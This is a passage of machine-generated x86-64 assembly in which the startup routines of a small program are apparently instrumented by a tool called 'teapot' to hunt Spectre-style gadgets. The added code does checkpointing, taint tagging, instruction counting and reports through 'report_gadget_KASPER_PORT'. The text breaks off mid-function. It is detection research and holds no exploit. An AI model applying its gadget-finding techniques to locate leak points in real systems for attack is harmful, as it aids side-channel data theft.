
#===================================
.data
#===================================

.align 8
#-----------------------------------
.globl __data_start
.type __data_start, @notype
#-----------------------------------
__data_start:
#-----------------------------------
.weak data_start
.type data_start, @notype
#-----------------------------------
data_start:
.L_0:
          .zero 8
#-----------------------------------
.globl __dso_handle
.hidden __dso_handle
.type __dso_handle, @object
#-----------------------------------
__dso_handle:
.L_4008:
          .quad .L_4008
#-----------------------------------
.globl array_size
.type array_size, @object
.size array_size, 4
#-----------------------------------
array_size:
          .byte 0x8
          .byte 0x0
          .byte 0x0
          .byte 0x0
#-----------------------------------
.globl _edata
.type _edata, @notype
#-----------------------------------
_edata:
#===================================
# end section .data
#===================================

#===================================
.bss
#===================================

.align 1
#-----------------------------------
.globl __bss_start
.type __bss_start, @notype
#-----------------------------------
__bss_start:
#-----------------------------------
.type completed.8061, @object
.size completed.8061, 1
#-----------------------------------
completed.8061:
          .zero 4
#-----------------------------------
.globl __TMC_END__
.hidden __TMC_END__
.type __TMC_END__, @object
#-----------------------------------
__TMC_END__:
.L_4018:
#-----------------------------------
.globl _end
.type _end, @notype
#-----------------------------------
_end:
#===================================
# end section .bss
#===================================

#===================================
.section .teapot_transient, "ax"
#===================================

.__transient_start__teapot__:

_start__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            xorl %ebx,%ebx
            movb %bl,(dift_reg_tags+7)
.L__dift_done__teapot___2:

            nop
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            xorl %ebp,%ebp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            xorl %ebx,%ebx
            orb (dift_reg_tags+3),%bl
            movb %bl,(dift_reg_tags+9)
.L__dift_done__teapot___3:

            nop
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rdx,%r9
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rax,(scratchpad+524320)
            lahf 
            seto %al
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524320),%rax
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %ecx,%ecx
            orb (%rax),%cl
            movb %cl,(dift_reg_tags+4)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___4

            movb (dift_reg_queued_tag),%cl
            movzbq (dift_reg_queued_id),%rbx
            orb %cl,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___4:

            nop
            movq %rax,(scratchpad+524320)
            movq (scratchpad+524312),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524320),%rax
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            popq %rsi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            xorl %ebx,%ebx
            orb (dift_reg_tags+6),%bl
            movb %bl,(dift_reg_tags+3)
.L__dift_done__teapot___5:

            nop
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rsp,%rdx
            andq $-16,%rsp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rax,(scratchpad+524328)
            lahf 
            seto %al
            movq %rax,(scratchpad+524320)
            movq (scratchpad+524328),%rax
            xorl %edx,%edx
            orb (dift_reg_tags),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___6:

            nop
            movq %rax,(scratchpad+524328)
            movq (scratchpad+524320),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524328),%rax
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rax,(scratchpad+524328)
            lahf 
            seto %al
            movq %rax,(scratchpad+524320)
            movq (scratchpad+524328),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___8:

            nop
            movq %rax,(scratchpad+524328)
            movq (scratchpad+524320),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524328),%rax
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %rsp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            xorl %ebx,%ebx
            movb %bl,(dift_reg_tags+8)
.L__dift_done__teapot___10:

            nop
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            leaq (__libc_csu_fini__teapot__)(%rip),%r8
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            xorl %ebx,%ebx
            movb %bl,(dift_reg_tags+2)
.L__dift_done__teapot___11:

            nop
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            leaq (__libc_csu_init__teapot__)(%rip),%rcx
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            xorl %ebx,%ebx
            movb %bl,(dift_reg_tags+5)
.L__dift_done__teapot___12:

            nop
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            leaq (main__teapot__)(%rip),%rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq 11666(%rip),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___15

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___15:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            callq *(__libc_start_main@GOTPCREL)(%rip)

            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            hlt 

            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            nop
.size _start__teapot__, . - _start__teapot__
deregister_tm_clones__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movq (memory_history_top),%rbx
            movq (%rax),%rdi
            movq %rax,(%rbx)
            movq %rdi,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movb $255,(%rax)
            movq (scratchpad+524288),%rbx
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___19:

            nop
            leaq (_end)(%rip),%rdi
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___20:

            nop
            movq (scratchpad+524288),%rbx
            leaq (_end)(%rip),%rax
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags),%al
            orb (dift_reg_tags+5),%al
            testb $48,%al
            je .L__check_ok__teapot___21

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___21:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $4,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            cmpq %rdi,%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__871aa948_cddd_4f5b_8eb7_1facbb9d78c1__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___23)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__871aa948_cddd_4f5b_8eb7_1facbb9d78c1__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___23:

            nop
            je .L_1278__teapot__
.L__trampoline_target__0f1a0ba5_030a_4d24_82a6_5dc94d3afaf7__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq 11630(%rip),%rbx
            btcq $45,%rbx
            xorl %eax,%eax
            orb (%rbx),%al
            movb %al,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___24

            movb (dift_reg_queued_tag),%al
            movzbq (dift_reg_queued_id),%rcx
            orb %al,(dift_reg_tags)(%rcx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___24:

            nop
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq (_ITM_deregisterTMCloneTable@GOTPCREL)(%rip),%rax
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags),%al
            orb (dift_reg_tags),%al
            testb $48,%al
            je .L__check_ok__teapot___25

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___25:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            testq %rax,%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__9ed98da6_eadc_4929_9866_9d34a66fdecf__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___27)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__9ed98da6_eadc_4929_9866_9d34a66fdecf__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___27:

            nop
            je .L_1278__teapot__
.L__trampoline_target__3af905d6_372f_42e0_925a_313b2f99eda8__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rax,%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___30

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___30:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmpq *%rax
.L_1278__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___33

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___33:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size deregister_tm_clones__teapot__, . - deregister_tm_clones__teapot__
register_tm_clones__teapot__:

            movq %rsp,%rdi
            shrq $3,%rdi
            leaq 2147450880(%rdi),%rdi
            movq (memory_history_top),%rax
            movq (%rdi),%rsi
            movq %rdi,(%rax)
            movq %rsi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rdi)
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___35:

            nop
            leaq (_end)(%rip),%rdi
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___36:

            nop
            leaq (_end)(%rip),%rsi
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+5),%al
            orb (dift_reg_tags+4),%al
            movb %al,(dift_reg_tags+4)
.L__dift_done__teapot___37:

            nop
            movq (scratchpad+524288),%rbx
            subq %rdi,%rsi
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+4),%al
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___38:

            nop
            movq (scratchpad+524288),%rbx
            movq %rsi,%rax
            shrq $63,%rsi
            sarq $3,%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %ebx,%ebx
            orb (dift_reg_tags),%bl
            orb (dift_reg_tags+4),%bl
            movb %bl,(dift_reg_tags+4)
.L__dift_done__teapot___39:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            addq %rax,%rsi
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+4),%al
            testb $48,%al
            je .L__check_ok__teapot___40

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___40:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $9,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            sarq $1,%rsi
            movq %rax,(scratchpad)
            leaq (.__trampoline__9d890186_5d58_4dc5_b875_330870304b82__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___42)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__9d890186_5d58_4dc5_b875_330870304b82__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___42:

            nop
            je .L_12b8__teapot__
.L__trampoline_target__6c1a7b2a_ea4f_4e65_be97_0007a1b2e15c__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq 11589(%rip),%rbx
            btcq $45,%rbx
            xorl %eax,%eax
            orb (%rbx),%al
            movb %al,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___43

            movb (dift_reg_queued_tag),%al
            movzbq (dift_reg_queued_id),%rcx
            orb %al,(dift_reg_tags)(%rcx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___43:

            nop
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq (_ITM_registerTMCloneTable@GOTPCREL)(%rip),%rax
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags),%al
            orb (dift_reg_tags),%al
            testb $48,%al
            je .L__check_ok__teapot___44

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___44:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            testq %rax,%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__e7bf71ac_233e_4d96_a5d9_49bd4408bafb__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___46)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__e7bf71ac_233e_4d96_a5d9_49bd4408bafb__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___46:

            nop
            je .L_12b8__teapot__
.L__trampoline_target__fa7464de_d735_4681_a4c1_a729a17fce2a__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rax,%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___49

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___49:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmpq *%rax
.L_12b8__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___52

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___52:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size register_tm_clones__teapot__, . - register_tm_clones__teapot__
__do_global_dtors_aux__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %eax,%eax
            leaq (completed.8061)(%rip),%rbx
            btcq $45,%rbx
            orb (%rbx),%al
            testb $48,%al
            je .L__check_ok__teapot___54

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___54:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            cmpb $0,(completed.8061)(%rip)
            movq %rax,(scratchpad)
            leaq (.__trampoline__b9212420_fcfa_44cb_9e14_56097bdc3d1e__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___56)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__b9212420_fcfa_44cb_9e14_56097bdc3d1e__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___56:

            nop
            jne .L_12f8__teapot__
.L__trampoline_target__66486815_7f0e_4589_bda2_01ad7a9bed52__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+7),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___57:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %rbp
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
